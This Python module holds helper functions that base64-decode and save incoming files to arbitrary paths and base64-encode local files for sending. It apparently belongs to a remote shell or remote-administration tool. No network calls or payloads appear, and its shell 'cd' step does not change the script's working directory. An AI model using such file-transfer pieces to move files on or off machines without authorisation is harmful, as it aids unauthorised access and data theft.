import base64
import os
import subprocess
import json

def save_file(file_data, shell_process):
    try:
        filename = file_data.get("filename", "")
        content = file_data.get("content", "")
        path = file_data.get("path", "")

        if not filename or not content:
            return "[Error] Missing filename or content"

        file_content = base64.b64decode(content)

        if path:
            save_path = os.path.abspath(path)
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
        else:
            if shell_process and shell_process.stdin:
                shell_process.stdin.write("cd\n")
                shell_process.stdin.flush()
                save_path = os.path.join(os.getcwd(), filename)
            else:
                save_path = os.path.join(os.getcwd(), filename)

        with open(save_path, "wb") as f:
            f.write(file_content)
        return f"[Success] File {filename} saved to {save_path}"
    except Exception as e:
        return f"[Error] Failed to save file: {str(e)}"

def send_file(file_path):
    try:
        file_path = os.path.abspath(file_path)
        if not os.path.exists(file_path):
            return f"[Error] File not found: {file_path}"

        with open(file_path, "rb") as f:
            content = f.read()
            base64_content = base64.b64encode(content).decode("utf-8")
            return json.dumps({
                "filename": os.path.basename(file_path),
                "content": base64_content
            })
    except Exception as e:
        return f"[Error] Failed to send file: {str(e)}"